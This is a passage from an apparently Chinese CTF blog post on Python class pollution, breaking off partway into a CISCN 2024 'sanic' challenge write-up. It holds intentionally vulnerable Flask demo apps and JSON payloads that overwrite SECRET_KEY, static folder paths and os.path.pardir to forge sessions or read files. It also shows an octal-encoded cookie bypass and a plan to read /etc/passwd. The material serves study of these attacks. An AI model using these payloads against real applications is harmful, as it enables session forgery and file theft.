punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">"[+]Config:%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>我们并不知道 secretkey 是什么，所以如果能够污染我们就可以实现任意的 session 伪造</p>
+<figure class="highlight json"><figcaption data-lang="JSON"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token property">"config"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                    <span class="token property">"SECRET_KEY"</span> <span class="token operator">:</span><span class="token string">"Polluted~"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h4 id="_got_first_request"><a class="anchor" href="#_got_first_request">#</a> _got_first_request:</h4>
+<pre><code>用于判定是否某次请求为子Flask启动后第一次请求，是Flask.got_first_request函数的返回值，此外还会影响装饰器app.before_first_request的调用，而_got_first_request值为假时才会调用：
+所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。
+</code></pre>
+<p>代码样例是：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment"># Recursive merge function</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v</pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"Is flag here?"</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">global</span> flag</pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"special"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> app<span class="token punctuation">.</span>special <span class="token operator">==</span> <span class="token string">"U_Polluted_It"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">global</span> flag</pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token builtin">setattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"special"</span><span class="token punctuation">,</span> <span class="token string">"U_Polluted_It"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">return</span> flag</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token string">"__init__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token string">"__globals__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token string">"app"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token string">"_got_first_request"</span><span class="token punctuation">:</span><span class="token boolean">False</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>原因是</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">global</span> flag</pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"special"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> app<span class="token punctuation">.</span>special <span class="token operator">==</span> <span class="token string">"U_Polluted_It"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"rt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="_static_url_path"><a class="anchor" href="#_static_url_path">#</a> _static_url_path:</h4>
+<p>当 python 指定了 static 静态目录以后，我们再进行访问就会定向到 static 文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>
+<pre><code>#static/index.html
+
+&lt;html&gt;
+&lt;h1&gt;hello&lt;/h1&gt;
+&lt;body&gt;    
+&lt;/body&gt;
+&lt;/html&gt;
+@app.route('/',methods=['POST', 'GET'])
+def index():
+    if request.data:
+        merge(json.loads(request.data), instance)
+    return &quot;flag in ./flag but heres only static/index.html&quot;
+payload=&#123;
+    &quot;__init__&quot;:&#123;
+        &quot;__globals__&quot;:&#123;
+            &quot;app&quot;:&#123;
+                &quot;_static_folder&quot;:&quot;./&quot;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="ospathpardir"><a class="anchor" href="#ospathpardir">#</a> os.path.pardir:</h4>
+<p>套一下师傅的示例脚本来学习一下：</p>
+<pre><code>#app.py
+
+from flask import Flask,request
+import json
+
+app = Flask(__name__)
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+class cls():
+    def __init__(self):
+        pass
+
+instance = cls()
+
+@app.route('/',methods=['POST', 'GET'])
+def index():
+    if request.data:
+        merge(json.loads(request.data), instance)
+    return &quot;flag in ./flag but heres only static/index.html&quot;
+
+
+app.run(host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p>我们进行目录穿梭进行访问发现报了 500 的错误：</p>
+<p>是因为：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># pseudocode from jinja2/templating.py</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>sep <span class="token keyword">in</span> filename <span class="token keyword">or</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>pardir <span class="token keyword">in</span> filename<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">raise</span> TemplateNotFound</pre></td></tr></table></figure><p>我们需要把  <code>os.path.pardir</code> （ <code>&quot;..&quot;</code> ）改成别的字符串，就绕过检测，模板引擎就会正常读取上级目录里的文件</p>
+<pre><code>payload:
+&#123;
+  &quot;__init__&quot;: &#123;
+    &quot;__globals__&quot;: &#123;
+      &quot;os&quot;: &#123;
+        &quot;path&quot;: &#123;
+          &quot;pardir&quot;: &quot;,&quot;    // 把 .. 换成 ,
+        &#125;
+      &#125;
+    &#125;
+  &#125;
+&#125;
+
+</code></pre>
+<p>就可以直接../../../flag 直接获取 flag 了</p>
+<h3 id="题目解析"><a class="anchor" href="#题目解析">#</a> 题目解析</h3>
+<h4 id="2024ciscn-sanic"><a class="anchor" href="#2024ciscn-sanic">#</a> 2024ciscn sanic</h4>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141911705.png" alt="image-20250514191113540" /></p>
+<p>给的提示：</p>
+<p>/admin 和 /src 的敏感目录</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> sanic_session <span class="token keyword">import</span> Session</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> pydash</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># pydash==5.1.2</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>Session<span class="token punctuation">(</span>app<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> html<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'static/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">if</span> user<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'adm;n'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login success"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="48"></td><td><pre>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>我们发现 /login 路由里面，当我们 cookie 穿的 user 的值为 adm;n 是，为给我们设置为 true，总所周知，cookie 中的；被视为分割符，正常传肯定失败，那我们就要去想想怎么绕过，</p>
+<p>既然是 sanic 的框架，我们就去搜 sanic 框架里的源码（cookies）</p>
+<p>发现在 sanic/cookies/request.py 中的_unquote 函数存在八进制解码的逻辑，且开头会去掉双引号于是我们找到了绕过的方法 “\141\144\155\073\156”</p>
+<h5 id="绕过cookie将当分割符也可以adm073n"><a class="anchor" href="#绕过cookie将当分割符也可以adm073n">#</a> 绕过 cookie 将；当分割符，也可以 adm\073n</h5>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151552790.png" alt="image-20250515155219621" /></p>
+<p>登陆成功</p>
+<h4 id="分析"><a class="anchor" href="#分析">#</a> 分析：</h4>
+<p>然后主要的就是</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><pre><code>那么我们的目标就很明确了，我们得修改__file__的值，来读不同的文件，先试试/etc/passwd
+</code></pre>
+<p>但是得看代码是怎么写的</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>从这里</p>
+<pre><code>pydash.set_(pollute, key, value)
+</code></pre>
+<p>到</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">set_</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">return</span> set_with<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> path<span class="token punctuation">,</span> value<span class="token punctuation">)</span></pre></td></tr></table></figure><p>再到：</p>
